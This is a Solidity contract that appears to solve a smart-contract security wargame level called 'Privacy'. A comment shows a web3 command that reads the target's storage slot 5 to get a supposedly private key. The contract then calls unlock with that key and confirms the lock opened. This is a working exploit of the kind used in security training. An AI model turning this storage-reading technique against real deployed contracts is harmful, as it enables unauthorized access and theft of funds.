// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IPrivacy.sol";

contract PrivacyAttack {
    /**
     * @dev To get key from storage, you can run this script in client side:
     * > (await web3.eth.getStorageAt(contract.address, 5)).slice(0, 2 + 32)
     */
    function attack(IPrivacy target, bytes16 key) external {
        target.unlock(key);

        require(!target.locked(), "Privacy: Attack failed");
    }
}
